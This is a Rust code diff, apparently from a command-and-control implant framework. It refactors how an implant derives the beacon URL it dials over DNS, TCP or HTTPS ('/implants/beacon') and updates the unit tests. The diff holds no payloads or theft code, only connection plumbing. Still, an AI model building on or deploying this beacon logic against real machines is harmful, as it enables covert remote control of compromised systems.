@@ -116,40 +116,24 @@ pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], ack
     }
 }
 
-/// The URL this bake's carriages dial: the baked beacon front when the
-/// profile names one (the split-socket shape), else the front that answered
-/// the enrollment. The baked front carries scheme and authority (the dial
-/// shape the server bakes); the envelope route hangs off it, so a baked
-/// front without its own route gains the beacon path. The socket family's
-/// dial carries no route at all -- the raw address the carriage connects
-/// to, normalized to its bare authority.
+/// The URL this bake's carriages dial: the beacon route hanging off the
+/// enroll front the profile names. The baked front carries scheme and
+/// authority (the dial shape the server bakes); the envelope route hangs off
+/// it, so a baked front without its own route gains the beacon path. The
+/// socket family's dial carries no route at all -- the raw address the
+/// carriage connects to, normalized to its bare authority.
 pub fn dialed_beacon_url(profile: &Profile) -> String {
-    // The DNS family's dial data is the zone itself, and the bake strips
-    // paths off its derived beaconURL -- the very place the zone lives. So
-    // the DNS dial picks whichever front CARRIES a zone (the split-socket
-    // bake would name a zoned beacon front; the single-front bake carries
-    // it on the enroll front), before the web families' route derivation
-    // touches any path at all.
-    let dns_fronts = [
-        profile.beacon_url.trim_end_matches('/'),
-        profile.enroll_url.trim_end_matches('/'),
-    ];
-    for front in dns_fronts {
-        if let Some((_, _, zone)) = dns::parse_front(front) {
-            if !zone.is_empty() {
-                return front.to_string();
-            }
+    // The DNS family's dial data is the zone itself, and the route
+    // derivation would bury it under the beacon path -- the zone is the
+    // dial's own data, not a route. So a dns-schemed enroll front is the
+    // dial verbatim, before the web families' route derivation touches any
+    // path at all.
+    if let Some((_, _, zone)) = dns::parse_front(profile.enroll_url.trim_end_matches('/')) {
+        if !zone.is_empty() {
+            return profile.enroll_url.trim_end_matches('/').to_string();
         }
     }
-    if profile.beacon_url.is_empty() {
-        return normalize_fronts(beacon_url(&profile.enroll_url));
-    }
-    let baked = profile.beacon_url.trim_end_matches('/');
-    normalize_fronts(if baked.contains("/implants/") {
-        baked.to_string()
-    } else {
-        format!("{baked}/implants/beacon")
-    })
+    normalize_fronts(beacon_url(&profile.enroll_url))
 }
 
 /// The non-web families' front shapes: the socket's dial is the bare
@@ -211,7 +195,6 @@ mod tests {
     fn profile() -> Profile {
         Profile {
             enroll_url: "https://front.example".into(),
-            beacon_url: String::new(),
             fallback_enroll_urls: Vec::new(),
             ca_pem: String::new(),
             tls_trust: "pinned".into(),
@@ -258,10 +241,11 @@ mod tests {
 
     #[test]
     fn dialed_fronts_carry_the_non_web_families_dial_data() {
-        // The DNS zone is dial data, not a route: whichever front carries
-        // it wins, and the web derivation never touches it.
+        // The DNS zone is dial data, not a route: the dns-schemed enroll
+        // front is the dial verbatim, and the web derivation never touches
+        // it.
         let mut dns = profile();
-        dns.beacon_url = "dns://resolver.example/zone.example".into();
+        dns.enroll_url = "dns://resolver.example/zone.example".into();
         assert_eq!(
             dialed_beacon_url(&dns),
             "dns://resolver.example/zone.example"
@@ -269,19 +253,12 @@ mod tests {
         let mut tcp = profile();
         tcp.enroll_url = "tcp://10.0.0.9:8443/anything".into();
         assert_eq!(dialed_beacon_url(&tcp), "tcp://10.0.0.9:8443");
-        // The web families: the route derived off the front that answered,
-        // or the baked split front with the route appended.
+        // The web family: the route derived off the front.
         let mut web = profile();
         web.enroll_url = "https://front.example/enroll".into();
         assert_eq!(
             dialed_beacon_url(&web),
             "https://front.example/implants/beacon"
-        );
-        let mut split = profile();
-        split.beacon_url = "https://beacon.example".into();
-        assert_eq!(
-            dialed_beacon_url(&split),
-            "https://beacon.example/implants/beacon"
         );
     }
 }
